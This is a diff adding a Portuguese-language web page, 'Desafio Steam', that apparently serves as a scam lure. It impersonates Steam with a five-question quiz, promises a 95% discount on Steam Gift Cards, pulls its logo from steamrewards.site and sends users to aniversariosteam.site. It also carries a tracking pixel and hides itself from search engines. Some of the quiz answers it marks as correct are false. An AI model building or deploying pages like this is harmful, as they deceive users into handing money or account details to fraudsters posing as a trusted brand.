@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Desafio Steam</title>
+    <link rel="icon" type="image/png" href="images/favicon.png">
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "67257be97e2e2f1c8710af74";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+
+    <!-- Fontes Google -->
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+
+    <!-- Estilos otimizados -->
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        .header {
+            background-color: #043c5c;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .container {
+            background-color: white;
+            max-width: 440px; /* Reduzindo o tamanho da caixa */
+            margin: 20px auto;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #043c5c;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            display: block; /* Mudando para block para ocupar toda a largura */
+            width: 95%; /* Ocupando 100% da largura */
+            padding: 13px;
+            background-color: #043c5c;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: #043c5c;
+        }
+
+        .strong {
+            font-weight: 700;
+            color: #333;
+        }
+
+        /* Estilos para a tela inicial */
+        .intro {
+            display: block;
+        }
+
+        .quiz {
+            display: none;
+        }
+
+        .progress-bar {
+            background-color: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            height: 11px;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .progress {
+            background-color: green;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .question {
+            margin: 20px 0;
+        }
+
+        .btn-answer {
+            display: block;
+            padding: 10px;
+            background-color: #f1f1f1;
+            margin: 10px 0;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-answer:hover {
+            background-color: #ddd;
+        }
+
+        /* Mensagem de erro */
+        .error-message {
+            display: none;
+            color: #d32f2f;
+            background-color: #ffebee;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            border: 1px solid #d32f2f;
+        }
+
+        /* Tamanho da imagem reduzido */
+        .product-image {
+            width: 70%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        @media only screen and (max-width: 600px) {
+    .container {
+        max-width: 85%; /* Reduz ainda mais a largura do container */
+        padding: 10px; /* Mantém o padding pequeno */
+        margin: 10px auto; /* Mantém as margens automáticas */
+    }
+
+    p {
+        font-size: 14px; /* Continua com o tamanho da fonte reduzido */
+        line-height: 1.4; /* Mantém o espaçamento entre linhas mais compacto */
+    }
+
+    h2 {
+        font-size: 20px; /* Diminui o tamanho do título */
+    }
+
+    .btn {
+        padding: 10px; /* Reduz o padding do botão */
+        font-size: 16px; /* Reduz o tamanho da fonte do botão */
+    }
+
+    .product-image {
+        width: 60%; /* Reduz a largura da imagem para não ocupar muito espaço */
+    }
+}
+    </style>
+</head>
+
+<body>
+
+    <!-- Cabeçalho -->
+    <div class="header">
+        <img src="https://steamrewards.site/Seguro/images/logo.png" alt="Olympikus Logo">
+    </div>
+
+    <!-- Quiz -->
+    <div class="container quiz" id="quiz-container" style="display: block;">
+        <h2 style="color: black;">Desafio Steam</h2>
+
+        <span style="color: #011E41; font-size: 23px;">Pergunta <span id="question-number">1</span> de 5</span>
+
+        <div class="progress-bar">
+            <div class="progress" id="progress" style="width: 20%;"></div>
+        </div>
+
+        <p id="question-text"></p>
+        
+        <div class="question" id="question-container">
+            <p style="font-size: 22px;" id="question-title">QUAL É O ANO DE LANÇAMENTO DA PLATAFORMA STEAM?</p>
+            <div class="btn-answer" onclick="checkAnswer(0)">2002</div>
+            <div class="btn-answer" onclick="checkAnswer(1)">2003</div>
+            <div class="btn-answer" onclick="checkAnswer(2)">2004</div>
+        </div>
+
+        <div id="error-message" class="error-message" style="display: none;">Resposta incorreta! Por favor, tente novamente.</div>
+        <a href="https://aniversariosteam.site" id="final-btn" class="btn" style="display: none;">FINALIZAR DESAFIO</a>
+    </div>
+
+    <script>
+        const questions = [
+            {
+                question: "QUAL É O ANO DE LANÇAMENTO DA PLATAFORMA STEAM?",
+                answers: ["2002", "2003", "2004"],
+                correct: 1
+            },
+            {
+                question: "QUAL É O JOGO MAIS VENDIDO NA STEAM DE TODOS OS TEMPOS?",
+                answers: ["Grand Theft Auto V", "Counter-Strike", "PUBG"],
+                correct: 0
+            },
+            {
+                question: "QUAL É O SISTEMA DE RECOMPENSAS DA STEAM QUE PERMITE GANHAR PONTOS POR ATIVIDADES?",
+                answers: ["Steam Points", "Steam Rewards", "Steam Badges"],
+                correct: 1
+            },
+            {
+                question: "QUAL DOS SEGUINTES JOGOS É UM EXEMPLO DE UM BATTLE ROYALE DISPONÍVEL NA STEAM?",
+                answers: ["Fortnite", "Apex Legends", "Call of Duty"],
+                correct: 1
+            },
+            {
+                question: "QUAL É A MAIOR COMUNIDADE DE JOGOS NA STEAM?",
+                answers: ["RPGs", "Jogos de ação", "Jogos de simulação"],
+                correct: 0
+            }
+        ];
+    
+        let currentQuestion = 0;
+        const totalQuestions = questions.length;
+    
+        const questionContainer = document.getElementById('question-container');
+        const questionTitle = document.getElementById('question-title');
+        const progress = document.getElementById('progress');
+        const finalBtn = document.getElementById('final-btn');
+        const questionText = document.getElementById('question-text');
+        const errorMessage = document.getElementById('error-message');
+        const quizContainer = document.getElementById('quiz-container');
+        const questionNumber = document.getElementById('question-number');
+    
+        // Função para carregar a pergunta com o índice especificado
+        function loadQuestion(index) {
+            const q = questions[index];
+            questionTitle.textContent = q.question;
+            questionNumber.textContent = index + 1; // Atualizando o número da pergunta
+            const btnAnswers = document.querySelectorAll('.btn-answer');
+            btnAnswers.forEach((btn, i) => {
+                btn.textContent = q.answers[i];
+                btn.setAttribute('onclick', `checkAnswer(${i})`);
+            });
+    
+            const progressPercentage = ((index + 1) / totalQuestions) * 100;
+            progress.style.width = progressPercentage + '%';
+            errorMessage.style.display = 'none';
+        }
+    
+        // Função para verificar a resposta
+        function checkAnswer(selected) {
+            if (selected === questions[currentQuestion].correct) {
+                currentQuestion++;
+                if (currentQuestion < totalQuestions) {
+                    loadQuestion(currentQuestion);
+                } else {
+                    showFinalMessage();
+                }
+            } else {
+                errorMessage.style.display = 'block'; // Mostrar mensagem de erro
+            }
+        }
+    
+        // Função para mostrar a mensagem final
+        function showFinalMessage() {
+            questionText.innerHTML = "<strong style='font-size: 24px;'>PARABÉNS!</strong><br>Você completou o desafio com sucesso e ganhou um desconto de 95% nos Gift Cards da Steam<br><br>Aproveite e expanda sua biblioteca de jogos!";
+            questionContainer.style.display = 'none';
+            errorMessage.style.display = 'none';
+            finalBtn.style.display = 'block';
+        }
+    
+        // Iniciar o quiz automaticamente ao carregar a página
+        document.addEventListener("DOMContentLoaded", function() {
+            loadQuestion(currentQuestion);
+        });
+    </script>
+
+
+
+
+</body></html>
